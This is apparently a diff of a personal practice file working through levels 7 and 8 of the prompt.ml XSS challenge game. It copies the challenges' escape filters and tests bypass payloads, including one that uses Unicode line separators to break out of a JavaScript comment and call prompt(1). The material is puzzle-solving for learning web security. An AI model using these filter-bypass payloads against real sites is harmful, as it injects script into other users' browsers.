@@ -16,11 +16,12 @@ console.log(escape("http://prompt.ml/@000/test.js"));
 */
 
 
+/*
 // 7
 // #;prompt(1)#
-// /*#*/;prompt(1)/*#*/
+// /*#*///;prompt(1)/*#*/
 // '#';prompt(1)
-
+/*
 function escape(input) {
     // pass in something like dog#cat#bird#mouse...
     var segments = input.split('#');
@@ -33,3 +34,19 @@ function escape(input) {
 //console.log(escape("prompt(1)"))
 console.log(escape("><script>`#`;prompt(1)`#'</script>"))
 //console.log(escape("prompt(1)"))
+*/
+
+
+// 8
+function escape(input) {
+    // prevent input from getting out of comment
+    // strip off line-breaks and stuff
+    input = input.replace(/[\r\n</"]/g, '');
+
+    return '                                \n\
+<script>                                    \n\
+    // console.log("' + input + '");        \n\
+</script> ';
+}
+
+console.log(escape("'\u2028prompt(1)\u2028-->'"))
